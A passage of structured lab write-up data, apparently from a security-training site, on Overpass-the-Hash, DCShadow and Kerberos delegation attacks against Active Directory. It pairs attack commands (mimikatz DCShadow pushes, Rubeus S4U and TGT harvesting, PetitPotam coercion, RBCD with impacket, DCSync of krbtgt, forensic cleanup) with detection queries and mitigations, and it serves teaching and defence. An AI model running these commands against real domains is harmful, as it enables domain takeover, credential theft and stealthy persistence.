      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'asktgt /ptt — modern in-memory overpass.', why: 'Supports AES, runs from C2, no LSASS modification needed.', link: 'https://github.com/GhostPack/Rubeus' },
      { name: 'secretsdump.py', category: 'Credential Access', purpose: 'Pull NT + AES keys to feed into overpass.', why: 'AES keys are stored alongside NT hashes; -just-dc-user dumps both.', link: 'https://github.com/fortra/impacket' },
    ],
    enumerationDetection: [
      {
        title: 'LSASS access prior to anomalous TGT request',
        description: 'Same precursor as PtH — Sysmon 10 catching credential-stealing access to LSASS. Pair this with the 4768 anomaly below for a high-fidelity composite alert.',
        eventIds: ['10'],
        dataSource: 'Sysmon',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'Event\n| where Source == "Microsoft-Windows-Sysmon" and EventID == 10\n| where TargetImage endswith "lsass.exe"\n| where GrantedAccess has_any ("0x1010","0x1410","0x1438","0x1FFFFF")',
      },
    ],
    socDetection: [
      {
        title: 'TGT request (4768) from a host the user has never logged into',
        description: 'A real user only requests TGTs from hosts they actually log into. Overpass commonly fires from an attacker-controlled host that the user has never used. Compare 4768 source IP against historical 4624 source IPs per user.',
        eventIds: ['4768'],
        dataSource: 'DC Security log + Member servers',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'let knownHosts = SecurityEvent\n| where EventID == 4624\n| where TimeGenerated > ago(30d)\n| summarize knownIps=make_set(IpAddress) by Account=TargetUserName;\nSecurityEvent\n| where EventID == 4768\n| where TimeGenerated > ago(7d)\n| join kind=inner knownHosts on $left.TargetUserName == $right.Account\n| where IpAddress !in (knownIps)\n| project TimeGenerated, TargetUserName, IpAddress, Computer',
      },
      {
        title: 'AS-REQ encryption type anomaly',
        description: 'If GPO mandates AES, any 4768 with TicketEncryptionType 0x17 (RC4) is suspicious. Attackers often have only the NT hash, not the AES key, so they request RC4 — a tell.',
        eventIds: ['4768'],
        dataSource: 'DC Security log',
        queryLanguage: 'SPL',
        severity: 'High',
        query: 'index=wineventlog EventCode=4768 TicketEncryptionType=0x17\n| stats count by TargetUserName, IpAddress, PreAuthType\n| where count > 1',
      },
      {
        title: 'Rubeus / getTGT command-line keywords',
        description: 'Catch the tooling on endpoints. asktgt, getTGT, /aes256 strings in command lines are not produced by legitimate Windows tools.',
        eventIds: ['4688', '4104'],
        dataSource: 'Endpoint EDR / Sysmon',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'DeviceProcessEvents\n| where ProcessCommandLine has_any ("Rubeus.exe asktgt","getTGT.py","sekurlsa::pth /aes")',
      },
    ],
    detection: [
      '4768 TGT request from a host the user has never authenticated to.',
      '4768 with RC4 encryption type in an AES-mandated domain.',
      'LSASS access (Sysmon 10) shortly before an anomalous 4768.',
      'Rubeus asktgt / getTGT command lines on endpoints.',
      'Same user appearing as TGT-source from multiple geographically distinct IPs in a short window.',
    ],
    mitigation: [
      'Force AES-only Kerberos (msDS-SupportedEncryptionTypes = 0x18) — kills the RC4 NT-hash overpass path.',
      'Credential Guard prevents NT-hash extraction from LSASS in the first place.',
      'Protected Users group: members cannot use NTLM, RC4, DES — overpass impossible without the AES key.',
      'Tier-0 isolation: privileged accounts only ever authenticate from PAWs.',
      'Rotate service-account passwords frequently — overpass keys go stale faster.',
    ],
    remediation: [
      'Force-reset every account whose hash/key was exposed (each compromised host).',
      'Reset krbtgt twice if any Domain Admin key was overpassed.',
      'Rebuild compromised hosts; assume LSA is tainted.',
      'Move affected accounts into Protected Users.',
      'Pull 4768 logs for 90 days and hunt for prior unknown-source TGT requests.',
    ],
    mitre: [
      { id: 'T1550.002', name: 'Pass the Hash', url: 'https://attack.mitre.org/techniques/T1550/002/' },
      { id: 'T1558', name: 'Steal or Forge Kerberos Tickets', url: 'https://attack.mitre.org/techniques/T1558/' },
      { id: 'T1003.001', name: 'OS Credential Dumping — LSASS', url: 'https://attack.mitre.org/techniques/T1003/001/' },
    ],
    tools: ['Impacket (getTGT.py, secretsdump.py)', 'Mimikatz', 'Rubeus'],
    references: [
      { title: 'HTB Academy — Kerberos Attacks', url: 'https://academy.hackthebox.com/module/details/143' },
      { title: 'GhostPack — From Pass-the-Hash to Pass-the-Ticket with no Kerberos magic', url: 'https://posts.specterops.io/' },
      { title: 'MITRE ATT&CK T1558', url: 'https://attack.mitre.org/techniques/T1558/' },
    ],
  },
  // ======================= DCSHADOW =======================
  {
    id: 'ad-dcshadow',
    slug: 'ad-dcshadow',
    name: 'DCShadow — Rogue Domain Controller Replication Attack',
    shortName: 'DCShadow',
    category: 'Persistence',
    severity: 'Critical',
    difficulty: 'Insane',
    publishedAt: '2025-05-18',
    author: 'Ahmed Tareq',
    readingTime: 14,
    labProvider: 'HackTheBox',
    labName: 'Active Directory Persistence — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adDcShadowHero,
    summary:
      'DCShadow registers an attacker-controlled host as a temporary, fake Domain Controller, then uses native AD replication (DRSUAPI) to push arbitrary changes — adding SidHistory, dropping ACLs, planting backdoors — directly into the directory. Because the change comes through the legitimate replication channel, it bypasses standard 4662 / 5136 audit logs and is one of the stealthiest persistence techniques in AD.',
    prerequisites: [
      'Domain Admin (or equivalent: Replicating Directory Changes / All + Add/Remove from Replica).',
      'A Windows attacker host on the domain network, able to reach DCs on RPC.',
      'Mimikatz running as SYSTEM.',
      'Two console windows: one for the rogue DC server, one to push the change.',
    ],
    attackFlow: [
      'Acquire DA / replication rights on the target domain.',
      'Register the attacker host as a fake DC by writing nTDSDSA + Server objects under CN=Configuration.',
      'Add the attacker host to the Configuration > Sites > Servers container.',
      'Run mimikatz lsadump::dcshadow /push to send a DRSUAPI ReplicaAdd telling real DCs to pull our forged changes.',
      'Real DCs replicate the malicious attribute (SidHistory, primaryGroupID, msDS-AllowedToActOnBehalfOfOtherIdentity…) — no 5136 events on the target object.',
      'Cleanup: remove the fake DC objects to leave minimal artefact.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — Open two SYSTEM consoles',
        description:
          'DCShadow needs two privileged sessions: one will host the fake DC (server console), another will push the changes (client console). Use psexec -s -i to get an interactive SYSTEM shell.',
        commands: [
          'psexec.exe -s -i cmd.exe   # in BOTH windows',
          'mimikatz # privilege::debug',
        ],
      },
      {
        title: 'Step 2 — Stage the change in the SERVER console',
        description:
          'lsadump::dcshadow /object specifies the AD object we want to mutate, and /attribute names the attribute. /value supplies the new value. Calling /server with no other args puts mimikatz into "rogue DC mode" — it now answers DRSUAPI calls.',
        commands: [
          'mimikatz # lsadump::dcshadow /object:CN=mmorgan,CN=Users,DC=INLANEFREIGHT,DC=LOCAL /attribute:primaryGroupID /value:512',
          '# (mimikatz blocks waiting for a /push)',
        ],
      },
      {
        title: 'Step 3 — Push the change from the CLIENT console',
        description:
          'lsadump::dcshadow /push sends a DRSUAPI ReplicaAdd RPC to a real DC, telling it: "There is new data on this rogue DC, please pull it now." The real DC dutifully replicates the forged attribute into the directory.',
        commands: [
          'mimikatz # lsadump::dcshadow /push',
        ],
        output: '[+] DCShadow: change pushed successfully\n[+] mmorgan now in Domain Admins (primaryGroupID=512)',
      },
      {
        title: 'Step 4 — Common DCShadow primitives',
        description:
          'Once you can mutate any attribute, you have many high-impact options. Each line below is a real attack used in the wild.',
        commands: [
          '# Add SidHistory to make a regular user a covert Domain Admin\nlsadump::dcshadow /object:<user> /attribute:SidHistory /value:S-1-5-21-...-512',
          '# Plant Resource-Based Constrained Delegation backdoor\nlsadump::dcshadow /object:<computer> /attribute:msDS-AllowedToActOnBehalfOfOtherIdentity /value:<binary>',
          '# Disable Pre-Auth on the krbtgt account for AS-REP roasting later\nlsadump::dcshadow /object:CN=krbtgt,CN=Users,... /attribute:userAccountControl /value:4194816',
        ],
      },
      {
        title: 'Step 5 — Cleanup the fake DC objects',
        description:
          'DCShadow leaves nTDSDSA + Server objects under CN=Configuration. Remove them with adsiedit or ldp.exe to minimise forensic footprint.',
        commands: [
          'adsiedit.msc → Configuration > Sites > Default-First-Site-Name > Servers > <attacker-host> → delete',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'Open SYSTEM shell (twice)', command: 'psexec.exe -s -i cmd.exe' },
      { title: 'Mimikatz — stage rogue DC', command: 'lsadump::dcshadow /object:<DN> /attribute:<attr> /value:<v>' },
      { title: 'Mimikatz — push change', command: 'lsadump::dcshadow /push' },
      { title: 'SidHistory backdoor', command: '/attribute:SidHistory /value:S-1-5-21-...-512' },
      { title: 'RBCD backdoor on computer', command: '/attribute:msDS-AllowedToActOnBehalfOfOtherIdentity /value:<binary>' },
    ],
    commandExplanations: [
      {
        command: 'lsadump::dcshadow /object:CN=mmorgan,... /attribute:primaryGroupID /value:512',
        purpose: 'Stage the malicious change on the attacker (rogue DC) and wait for /push to broadcast it.',
        breakdown: [
          { flag: '/object', meaning: 'Distinguished Name of the AD object to mutate.' },
          { flag: '/attribute', meaning: 'Single attribute name to overwrite.' },
          { flag: '/value', meaning: 'New attribute value (raw or binary depending on the attribute).' },
        ],
        why: 'DCShadow targets ONE attribute at a time on purpose — minimal replication payload + harder to spot in DRSUAPI traffic.',
      },
      {
        command: 'lsadump::dcshadow /push',
        purpose: 'Send DRSUAPI ReplicaAdd to a real DC so it pulls the forged change from the rogue DC.',
        breakdown: [
          { flag: '/push', meaning: 'Trigger replication — no extra arguments needed because the rogue DC server is already listening from the first console.' },
        ],
        why: 'The push uses legitimate AD replication APIs, so the change propagates normally and the directory accepts it without writing a 5136 audit event on the target object.',
      },
    ],
    toolsExplained: [
      { name: 'Mimikatz lsadump::dcshadow', category: 'AD Persistence', purpose: 'Original DCShadow implementation — both server and push modes.', why: 'Only mature open-source tool that implements DRSUAPI server side.', link: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'PsExec (Sysinternals)', category: 'Privilege', purpose: 'Spawn SYSTEM-level interactive shell required for DCShadow.', why: 'Mimikatz needs SYSTEM to bind to the RPC endpoints used by DRSUAPI.', link: 'https://learn.microsoft.com/en-us/sysinternals/downloads/psexec' },
      { name: 'BloodHound', category: 'Path Mapping', purpose: 'Find the path to DA and confirm DCSync/Replicating rights.', why: 'DCShadow needs the same prerequisites as DCSync — BloodHound surfaces them.', link: 'https://bloodhound.specterops.io' },
      { name: 'adsiedit / ldp.exe', category: 'AD Management', purpose: 'Inspect and clean up the rogue DC objects.', why: 'No native DCShadow cleanup mode — manual removal is required.', link: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/' },
    ],
    enumerationDetection: [
      {
        title: 'Suspicious nTDSDSA / Server object creation',
        description: 'A new nTDSDSA object outside of a planned DC promotion is a near-certain DCShadow precursor. Audit Directory Service Changes catches the 5137 event.',
        eventIds: ['5137'],
        dataSource: 'Domain Controller — Directory Service log',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'SecurityEvent\n| where EventID == 5137\n| where ObjectClass in ("nTDSDSA","server")\n| where ObjectDN has "CN=Configuration"\n| project TimeGenerated, ObjectDN, ObjectClass, SubjectAccount=SubjectUserName',
      },
    ],
    socDetection: [
      {
        title: 'DRSUAPI ReplicaAdd from non-DC source',
        description: 'A DRSUAPI ReplicaAdd RPC originating from a host that is NOT in the Domain Controllers OU is a DCShadow attack. This requires DC RPC monitoring (Sysmon NetworkConnect on TCP/RPC port + ETW).',
        eventIds: ['ETW: Microsoft-Windows-RPC'],
        dataSource: 'DC ETW / network telemetry',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'WindowsEvent\n| where ProviderName == "Microsoft-Windows-RPC" and EventID == 5\n| where InterfaceUuid == "e3514235-4b06-11d1-ab04-00c04fc2dcd2"  // DRSUAPI\n| where SourceIP !in (DomainControllerIPs)',
      },
      {
        title: 'New SPN registration on a non-DC computer (GC/, E3514235-…)',
        description: 'DCShadow temporarily registers DC-style SPNs (GC/<host>, E3514235-4B06-11D1-AB04-00C04FC2DCD2/<host>) on the attacker box. Watching 5136 for SPN changes outside the DC OU catches this in real time.',
        eventIds: ['5136'],
        dataSource: 'Domain Controller — Directory Service log',
        queryLanguage: 'SPL',
        severity: 'Critical',
        query: 'index=wineventlog EventCode=5136 AttributeLDAPDisplayName=servicePrincipalName AttributeValue="GC/*" OR AttributeValue="E3514235*"\n| stats count by ObjectDN, AttributeValue, SubjectUserName',
      },
      {
        title: 'krbtgt or DA attribute change with no 5136 (silent change)',
        description: 'Periodically diff sensitive attributes (primaryGroupID, SidHistory, msDS-AllowedToActOnBehalfOfOtherIdentity) on Tier-0 objects against a known-good baseline. Any change without a corresponding 5136 = DCShadow.',
        eventIds: ['5136 (absent)'],
        dataSource: 'AD baseline diff (PowerShell scheduled task)',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: '// Pseudo: compare current values to baseline daily\nlet baseline = externaldata(...) ;\ncurrentValues\n| join kind=leftouter baseline on objectGUID, attribute\n| where currentValue != baselineValue\n| join kind=leftanti (SecurityEvent | where EventID == 5136) on objectGUID',
      },
    ],
    detection: [
      'Microsoft Defender for Identity native: "Suspected DCShadow attack (replication request)".',
      '5137 events for new nTDSDSA / Server objects.',
      '5136 events writing GC/ or E3514235- SPNs onto non-DC computer accounts.',
      'DRSUAPI RPC from non-DC source IPs.',
      'Sensitive attribute change on Tier-0 objects without a matching 5136.',
      'Mimikatz lsadump::dcshadow string in process command lines.',
    ],
    mitigation: [
      'Tightly restrict who can add objects to CN=Configuration → Sites → Servers (only Schema/Enterprise admins).',
      'Restrict and monitor the DS-Install-Replica extended right.',
      'Deploy Microsoft Defender for Identity — has a purpose-built DCShadow detector.',
      'Tier-0 isolation — DCShadow requires SYSTEM on a domain-joined host AND DA. Both should be impossible from Tier 1/2.',
      'Network-level allow list: only DCs may speak DRSUAPI to other DCs.',
      'Continuous attribute baselining of Tier-0 objects with PowerShell + git diff.',
    ],
    remediation: [
      'Identify every attribute that was modified — diff every Tier-0 object against the last clean backup.',
      'Roll back malicious values (SidHistory, primaryGroupID, ACLs, msDS-AllowedToActOnBehalfOfOtherIdentity).',
      'Remove the rogue nTDSDSA / Server objects from CN=Configuration.',
      'Reset krbtgt twice (10h gap) — assume DC compromise.',
      'Force-reset every Domain Admin and Tier-0 account.',
      'Pull 1 year of 5136/5137 logs and hunt for prior DCShadow activity.',
      'Audit every account in Domain Admins / Enterprise Admins; remove unexpected members.',
    ],
    mitre: [
      { id: 'T1207', name: 'Rogue Domain Controller', url: 'https://attack.mitre.org/techniques/T1207/' },
      { id: 'T1078.002', name: 'Valid Accounts — Domain Accounts', url: 'https://attack.mitre.org/techniques/T1078/002/' },
      { id: 'T1098.002', name: 'Account Manipulation — Additional Email Delegate Permissions', url: 'https://attack.mitre.org/techniques/T1098/002/' },
    ],
    tools: ['Mimikatz', 'PsExec', 'BloodHound', 'adsiedit', 'ldp.exe'],
    references: [
      { title: 'Original DCShadow paper — Vincent Le Toux & Benjamin Delpy', url: 'https://www.dcshadow.com/' },
      { title: 'MITRE ATT&CK T1207', url: 'https://attack.mitre.org/techniques/T1207/' },
      { title: 'Microsoft Defender for Identity — DCShadow detection', url: 'https://learn.microsoft.com/en-us/defender-for-identity/' },
      { title: 'AdSecurity — DCShadow analysis', url: 'https://adsecurity.org/?p=4119' },
    ],
  },
  // ======================= DELEGATION ATTACKS =======================
  {
    id: 'ad-delegation-attacks',
    slug: 'ad-delegation-attacks',
    name: 'Kerberos Delegation Attacks — Unconstrained, Constrained & RBCD',
    shortName: 'Delegation Attacks',
    category: 'Privilege Escalation',
    severity: 'Critical',
    difficulty: 'Hard',
    publishedAt: '2025-05-19',
    author: 'Ahmed Tareq',
    readingTime: 18,
    labProvider: 'HackTheBox',
    labName: 'Kerberos Delegation — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adDelegationHero,
    summary:
      'Kerberos delegation lets a service impersonate users to back-end services. Misconfigured delegation is one of the highest-impact AD attack surfaces. This room covers all three flavours — Unconstrained Delegation (TrustedForDelegation), Constrained Delegation (S4U2Self + S4U2Proxy), and Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity) — including how each is abused and detected.',
    prerequisites: [
      'Foothold on a domain user OR control of a misconfigured computer / service account.',
      'BloodHound to find delegation paths (TrustedForDelegation, AllowedToDelegate, AllowedToAct).',
      'Rubeus on Windows OR Impacket (getST.py) on Linux.',
      'Mimikatz for ticket extraction (Unconstrained scenario).',
    ],
    attackFlow: [
      'Enumerate accounts with delegation set (Unconstrained, Constrained, RBCD).',
      'UNCONSTRAINED: trick a privileged user into authenticating to the delegated host → grab their TGT from LSA.',
      'CONSTRAINED: use S4U2Self + S4U2Proxy to impersonate any user to the delegated SPNs.',
      'RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer pointing to a controlled account → S4U → impersonate any user against that computer.',
      'Use the impersonated tickets to access services and pivot to Domain Admin.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — Enumerate delegation across the domain',
        description:
          'Find every account with TrustedForDelegation (unconstrained), msDS-AllowedToDelegateTo (constrained), or msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD). PowerView and Impacket both surface these in one query.',
        commands: [
          '# PowerView — Unconstrained\nGet-DomainComputer -Unconstrained\nGet-DomainUser -TrustedToAuth',
          '# PowerView — Constrained\nGet-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto',
          '# Impacket — all delegation\nfindDelegation.py -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Pass!',
        ],
        output: 'AccountName     AccountType   DelegationRightsTo\nWEB01$          Computer      Unconstrained\nsvc-iis         User          MSSQLSvc/sql01:1433\nFILE01$         Computer      RBCD: ws01$',
      },
      {
        title: 'Step 2 — UNCONSTRAINED delegation: capture a TGT',
        description:
          'A computer with TrustedForDelegation receives the user\'s forwarded TGT every time someone authenticates to it. If we own the host (or a service on it), mimikatz dumps that TGT and we have full impersonation. The classic trigger is a printer-bug PetitPotam to coerce a DC to authenticate inbound.',
        commands: [
          '# On the unconstrained host:\nRubeus.exe monitor /interval:5 /nowrap',
          '# Coerce a DC to auth inbound (PetitPotam):\nPetitPotam.py -d INLANEFREIGHT.LOCAL -u htb-student -p Pass! 10.10.10.50 10.10.10.161',
          '# DC TGT now in Rubeus monitor output → ptt → DCSync',
          'Rubeus.exe ptt /ticket:<base64>',
          'mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt',
        ],
      },
      {
        title: 'Step 3 — CONSTRAINED delegation: S4U2Self + S4U2Proxy',
        description:
          'When a service account has msDS-AllowedToDelegateTo set, it can impersonate ANY user to the listed SPNs. The S4U2Self trick lets us request a ticket "on behalf of" Administrator → S4U2Proxy converts that into a usable TGS for the delegated SPN. From a foothold on the service account, we own those services as Administrator.',
        commands: [
          '# Linux / Impacket\ngetST.py -spn cifs/dc01.inlanefreight.local -impersonate Administrator INLANEFREIGHT.LOCAL/svc-iis:Pass!',
          'export KRB5CCNAME=Administrator.ccache',
          'psexec.py -k -no-pass INLANEFREIGHT.LOCAL/Administrator@dc01.inlanefreight.local',
          '# Windows / Rubeus\nRubeus.exe s4u /user:svc-iis /rc4:<NThash> /impersonateuser:Administrator /msdsspn:cifs/dc01 /ptt',
        ],
        output: '[*] Impersonating Administrator\n[*] Saving ticket in Administrator.ccache\nNT AUTHORITY\\SYSTEM',
      },
      {
        title: 'Step 4 — RESOURCE-BASED CONSTRAINED DELEGATION (RBCD)',
        description:
          'RBCD flips the configuration: instead of the impersonator being trusted, the TARGET trusts the impersonator. If we have GenericAll / GenericWrite on a computer object (a common BloodHound finding), we can write our own controlled account into msDS-AllowedToActOnBehalfOfOtherIdentity → S4U → impersonate any user against that target.',
        commands: [
          '# 1. Create a fake computer (any user can add 10 by default — MachineAccountQuota=10)\nimpacket-addcomputer -computer-name evilbox$ -computer-pass P@ssw0rd! -dc-host dc01 INLANEFREIGHT.LOCAL/htb-student:Pass!',
          '# 2. Write msDS-AllowedToActOnBehalfOfOtherIdentity on target (we have GenericWrite)\nimpacket-rbcd -delegate-from evilbox$ -delegate-to FILE01$ -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Pass! -action write',
          '# 3. S4U as evilbox$ impersonating Administrator against FILE01$\ngetST.py -spn cifs/file01.inlanefreight.local -impersonate Administrator INLANEFREIGHT.LOCAL/evilbox\\$:P@ssw0rd!',
          '# 4. Use the ticket\nexport KRB5CCNAME=Administrator.ccache && psexec.py -k -no-pass INLANEFREIGHT.LOCAL/Administrator@file01.inlanefreight.local',
        ],
      },
      {
        title: 'Step 5 — Defenders\' counter-moves to know',
        description:
          'Knowing what NOT to expect helps fingerprint defenders during an engagement: the "Account is sensitive and cannot be delegated" flag, Protected Users group, and msDS-SupportedEncryptionTypes pinned to AES all kill specific delegation primitives.',
        commands: [
          'Get-ADUser administrator -Properties AccountNotDelegated   # should be True',
          'Get-ADGroupMember "Protected Users"',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'Find all delegation', command: 'findDelegation.py DOMAIN/user:pass -dc-ip <DC>' },
      { title: 'PowerView — unconstrained', command: 'Get-DomainComputer -Unconstrained' },
      { title: 'Rubeus — monitor TGTs', command: 'Rubeus.exe monitor /interval:5 /nowrap' },
      { title: 'Coerce auth (PetitPotam)', command: 'PetitPotam.py -d <D> -u <u> -p <p> <ATTACKER_IP> <DC_IP>' },
      { title: 'Impacket — S4U', command: 'getST.py -spn <SPN> -impersonate Administrator DOMAIN/svc:pass' },
      { title: 'Rubeus — S4U', command: 'Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<SPN> /ptt' },
      { title: 'Add fake computer (RBCD)', command: 'impacket-addcomputer -computer-name evil$ -computer-pass <p> DOMAIN/user:pass' },
      { title: 'Write RBCD', command: 'impacket-rbcd -delegate-from evil$ -delegate-to TARGET$ DOMAIN/user:pass -action write' },
    ],
    commandExplanations: [
      {
        command: 'getST.py -spn cifs/dc01.inlanefreight.local -impersonate Administrator INLANEFREIGHT.LOCAL/svc-iis:Pass!',
        purpose: 'Constrained delegation S4U: ask the KDC for a TGS to a specific SPN, claiming we are running on behalf of Administrator.',
        breakdown: [
          { flag: '-spn', meaning: 'Target service we want a TGS for — must be in the service account\'s msDS-AllowedToDelegateTo list.' },
          { flag: '-impersonate', meaning: 'User we are impersonating via S4U2Self → S4U2Proxy chain.' },
          { flag: 'DOMAIN/svc:pass', meaning: 'The delegated service account context — we must control this account\'s creds.' },
        ],
        why: 'S4U2Proxy doesn\'t check the impersonated user\'s consent. As long as the service account has the msDS-AllowedToDelegateTo edge, we can impersonate ANY user (including DA) to the listed SPNs.',
      },
      {
        command: 'impacket-rbcd -delegate-from evilbox$ -delegate-to FILE01$ -dc-ip 10.10.10.161 DOMAIN/user:pass -action write',
        purpose: 'Write the attacker-controlled computer into the target\'s msDS-AllowedToActOnBehalfOfOtherIdentity attribute, enabling RBCD impersonation.',
        breakdown: [
          { flag: '-delegate-from', meaning: 'The attacker-controlled account that will impersonate.' },
          { flag: '-delegate-to', meaning: 'The target whose attribute we are modifying.' },
          { flag: '-action write', meaning: 'Append the attacker SID to msDS-AllowedToActOnBehalfOfOtherIdentity.' },
        ],
        why: 'Any GenericWrite or GenericAll edge to a computer becomes full takeover via RBCD — that\'s why BloodHound highlights these edges in red.',
      },
      {
        command: 'Rubeus.exe monitor /interval:5 /nowrap',
        purpose: 'Continuously watch the local Kerberos cache and dump every new TGT that arrives — the unconstrained-delegation harvester.',
        breakdown: [
          { flag: 'monitor', meaning: 'Long-running mode — poll the cache every interval.' },
          { flag: '/interval:5', meaning: 'Seconds between polls.' },
        ],
        why: 'On an unconstrained-delegation host, every inbound auth deposits a forwardable TGT in the LSA cache. Monitor catches them all — pair with PetitPotam to force a DC to authenticate and you have the DC TGT.',
      },
    ],
    toolsExplained: [
      { name: 'BloodHound', category: 'Path Mapping', purpose: 'Visualise all 3 delegation edges (TrustedForDelegation, AllowedToDelegate, AllowedToAct).', why: 'Without BloodHound, finding misconfigured delegation is needle-in-haystack — with it, one click maps the path.', link: 'https://bloodhound.specterops.io' },
      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'monitor / s4u / asktgt — every delegation primitive natively.', why: 'Best-in-class Windows Kerberos toolkit, runs in-memory from C2.', link: 'https://github.com/GhostPack/Rubeus' },
      { name: 'Impacket — getST.py', category: 'Kerberos / Linux', purpose: 'S4U2Self + S4U2Proxy from Linux.', why: 'Cross-platform alternative to Rubeus; works against Constrained and RBCD.', link: 'https://github.com/fortra/impacket' },
      { name: 'Impacket — addcomputer / rbcd', category: 'AD Modify', purpose: 'Create the fake computer and set RBCD attribute.', why: 'MachineAccountQuota=10 by default → any user can add the fake computer for RBCD.', link: 'https://github.com/fortra/impacket' },
      { name: 'PetitPotam', category: 'Coercion', purpose: 'Force a target (often a DC) to authenticate inbound to our host.', why: 'Provides the inbound TGT needed to abuse Unconstrained Delegation.', link: 'https://github.com/topotam/PetitPotam' },
      { name: 'Mimikatz', category: 'Ticket Theft', purpose: 'Dump the captured TGT from LSA on an unconstrained host.', why: 'sekurlsa::tickets exposes the forwarded TGT for Pass-the-Ticket.', link: 'https://github.com/gentilkiwi/mimikatz' },
    ],
    enumerationDetection: [
      {
        title: 'LDAP queries for delegation attributes',
        description: 'Attackers always enumerate delegation first. Watch for LDAP filters on userAccountControl 0x80000 (TrustedForDelegation), 0x1000000 (TrustedToAuth) or queries for msDS-AllowedToDelegateTo / msDS-AllowedToActOnBehalfOfOtherIdentity.',
        eventIds: ['1644', '4662'],
        dataSource: 'DC Directory Service log',
        queryLanguage: 'KQL',
        severity: 'Medium',
        query: 'Event\n| where EventID == 1644\n| where SearchFilter has_any ("userAccountControl:1.2.840.113556.1.4.803:=524288",  // TrustedForDelegation\n                            "userAccountControl:1.2.840.113556.1.4.803:=16777216", // TrustedToAuth\n                            "msDS-AllowedToDelegateTo",\n                            "msDS-AllowedToActOnBehalfOfOtherIdentity")',
      },
      {
        title: 'New computer account created by a non-admin (RBCD pre-stage)',
        description: 'MachineAccountQuota lets any user add 10 computers. A non-admin creating a new computer object that immediately gets used as a -delegate-from is a textbook RBCD signature.',
        eventIds: ['4741'],
        dataSource: 'DC Security log',
        queryLanguage: 'SPL',
        severity: 'High',
        query: 'index=wineventlog EventCode=4741\n| stats values(SubjectUserName) as creator, values(TargetUserName) as new_computer by _time\n| where creator!="*$"',
      },
    ],
    socDetection: [
      {
        title: 'msDS-AllowedToActOnBehalfOfOtherIdentity attribute change (RBCD planted)',
        description: 'This attribute is the RBCD primitive. ANY 5136 event writing it on a computer object outside a planned change window is a guaranteed compromise indicator.',
        eventIds: ['5136'],
        dataSource: 'DC Directory Service log',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == "msDS-AllowedToActOnBehalfOfOtherIdentity"\n| project TimeGenerated, ObjectDN, AttributeValue, ChangedBy=SubjectUserName',
      },
      {
        title: 'S4U2Proxy ticket request (4769 with Transited Services)',
        description: 'S4U2Proxy generates 4769 events on the DC where the TransittedServices field is populated. Legitimate S4U is rare — every event deserves review.',
        eventIds: ['4769'],
        dataSource: 'DC Security log',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'SecurityEvent\n| where EventID == 4769\n| where TransittedServices != ""\n| project TimeGenerated, Account=TargetUserName, Service=ServiceName, TransittedServices, IpAddress',
      },
      {
        title: 'PetitPotam / printer-bug coercion (RPC EFSRPC)',
        description: 'Inbound EfsRpcOpenFileRaw / EfsRpcAddUsersToFile RPC calls to a DC = coerced authentication, often paired with unconstrained delegation abuse. Defender for Identity flags this natively.',
        eventIds: ['ETW Microsoft-Windows-RPC'],
        dataSource: 'DC ETW',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'WindowsEvent\n| where ProviderName == "Microsoft-Windows-RPC" and EventID == 5\n| where InterfaceUuid in ("c681d488-d850-11d0-8c52-00c04fd90f7e",   // EFSRPC\n                          "df1941c5-fe89-4e79-bf10-463657acf44d")\n| project TimeGenerated, SourceIP, InterfaceUuid',
      },
      {
        title: 'TGS for cifs/<DC> from a host with TrustedForDelegation',
        description: 'When unconstrained delegation is abused, the attacker uses the DC TGT to request DCSync-style services. A 4769 for cifs/<DC> or LDAP/<DC> from a non-DC host is highly suspicious.',
        eventIds: ['4769'],
        dataSource: 'DC Security log',
        queryLanguage: 'SPL',
        severity: 'High',
        query: 'index=wineventlog EventCode=4769 (Service_Name="cifs/dc*" OR Service_Name="LDAP/dc*")\n| where Source_Network_Address NOT IN (DC_IP_LIST)\n| stats count by Account_Name, Service_Name, Source_Network_Address',
      },
    ],
    detection: [
      'LDAP enumeration of TrustedForDelegation / TrustedToAuth / msDS-AllowedToActOnBehalfOfOtherIdentity.',
      '5136 writing msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD planting).',
      '4769 events with non-empty TransittedServices (S4U2Proxy).',
      '4741 new-computer creation by a non-admin user (RBCD pre-stage).',
      'Inbound EFSRPC / Print Spooler RPC to DCs (coercion).',
      'TGS for cifs/<DC> or LDAP/<DC> from non-DC source IP.',
      'Microsoft Defender for Identity native: "Suspected use of S4U2Self".',
    ],
    mitigation: [
      'Enable "Account is sensitive and cannot be delegated" on every Tier-0 account (and add them to Protected Users).',
      'Eliminate Unconstrained Delegation entirely — no host other than DCs should have it. Move to RBCD or Constrained where delegation is genuinely needed.',
      'Reduce MachineAccountQuota to 0 to stop arbitrary users from adding fake computers (set ms-DS-MachineAccountQuota = 0 on the domain root).',
      'Audit and minimise GenericAll / GenericWrite / WriteOwner edges on computer objects (the RBCD enabler).',
      'Patch and disable PetitPotam / Print Spooler coercion vectors.',
      'Force AES-only Kerberos to limit RC4-only attacker tooling.',
